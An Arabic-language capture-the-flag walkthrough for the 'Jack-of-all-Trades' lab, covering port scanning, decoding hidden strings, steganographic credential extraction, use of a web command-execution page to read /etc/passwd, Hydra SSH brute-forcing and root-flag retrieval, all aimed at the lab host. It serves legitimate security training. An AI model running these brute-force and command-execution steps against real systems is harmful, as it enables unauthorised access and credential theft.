# حل لاب Jack-of-all-Trades

---

## 🎯 الهدف

نجيب **علم المستخدم** و **علم الروت** عن طريق تحليل الخدمات واكتشاف الثغرات المخفية خطوة خطوة.

---

## 📚 الفهرس

* الاستكشاف
* تحليل السورس
* فك الترميزات
* استخراج الستيجو
* تسجيل الدخول
* تنفيذ الأوامر
* كسر كلمة المرور
* علم المستخدم
* تصعيد الصلاحيات
* علم الروت
* ملخص مسار الاختراق
* الدروس المستفادة

---

## 🧭 الاستكشاف

أول خطوة دايمًا:

```bash
nmap -Pn -sV $TARGET
```

النتيجة:

```
22 → HTTP
80 → SSH
```

📌 الملاحظة
المنافذ معكوسة — حركة تضليل كلاسيكية.

---

## 🔎 تحليل السورس

الدخول:

```
http://$TARGET:22
```

تفحص الكود المصدري → نلاقي:

* مسار مخفي

```
/recovery.php
```

* نص مشفر Base64

---

## 🔐 فك الترميزات

نفك Base64:

```bash
echo "النص" | base64 -d
```

الناتج:

```
password=u?WtKSraq
```

---

### صفحة الاسترجاع

```
curl http://$TARGET:22/recovery.php
```

نلاقي تعليق Base32

نفكه:

```bash
echo "النص" | base32 -d | xxd -r -p
```

الناتج → ROT13
نفكه → يطلع رابط تلميح

💡 تلميح اللاب: جاك يحب الديناصورات

---

## 🖼 استخراج الستيجو

تحميل الصور:

```bash
wget http://$TARGET:22/assets/stego.jpg
wget http://$TARGET:22/assets/header.jpg
```

فحص الأولى:

```bash
steghide info stego.jpg
```

نجرب الباس:

```
u?WtKSraq
```

يعطينا:

```
creds.txt
```

الصورة الثانية:

```bash
steghide extract -sf header.jpg
```

يعطينا:

```
cms.creds
```

المحتوى:

```
jackinthebox : TplFxiSHjY
```

---

## 🔑 تسجيل الدخول

```bash
curl -i -X POST http://$TARGET:22/recovery.php \
-d "user=jackinthebox&pass=TplFxiSHjY"
```

نحصل Cookies + Redirect

نحفظها بملف:

```
cookies.txt
```

الدخول:

```bash
curl -b cookies.txt http://$TARGET:22/nnxhweOV/index.php
```

يظهر:

```
GET me a 'cmd' and I'll run it for you Future-Jack.
```

🔥 يعني عندنا تنفيذ أوامر مباشر

---

## 💻 تنفيذ الأوامر

```bash
curl -b cookies.txt \
"http://$TARGET:22/nnxhweOV/index.php?cmd=pwd"
```

نجرب:

```bash
cat /etc/passwd
```

نلاقي مستخدم مهم:

```
jack
```

---

## 🔓 كسر كلمة المرور

عرض ملفات الهوم:

```bash
ls /home
cat /home/jacks_password_list
```

تشغيل Hydra:

```bash
hydra -l jack -P pass.txt -s 80 ssh://$TARGET -t 4 -V
```

تسجيل الدخول:

```bash
ssh -p 80 jack@$TARGET
```

---

## 🏁 علم المستخدم

```bash
ls -lah
scp -P 80 jack@$TARGET:/home/jack/user.jpg .
```

نفتح الصورة → يظهر العلم

---

## ⬆️ تصعيد الصلاحيات

نجرب sudo:

```
sudo -l
```

مافي

نبحث SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

نبحث ملفات root قابلة قراءة:

```bash
find / -user root -readable -type f 2>/dev/null
```

نلاقي:

```
/root/root.txt
```

---

## 👑 علم الروت

```bash
strings /root/root.txt
```

يظهر العلم 🎯

---

## 🧠 ملخص مسار الاختراق

```
استكشاف
 ↓
تعليق مخفي
 ↓
ترميز
 ↓
Stego
 ↓
بيانات دخول
 ↓
تجاوز تسجيل الدخول
 ↓
تنفيذ أوامر
 ↓
قائمة كلمات مرور
 ↓
SSH
 ↓
تصعيد صلاحيات
 ↓
Root
```

---

## 📌 الدروس المستفادة

* لا تثق بالمنافذ الظاهرة
* التعليقات كنز معلومات
* الترميزات المتسلسلة علامة تحدي
* الصور ممكن تخبّي بيانات
* أحيانًا أبسط ثغرة = مدخل كامل

---

✔ خلص اللاب
لو وصلت لهون فانت ماشي صح 🔥
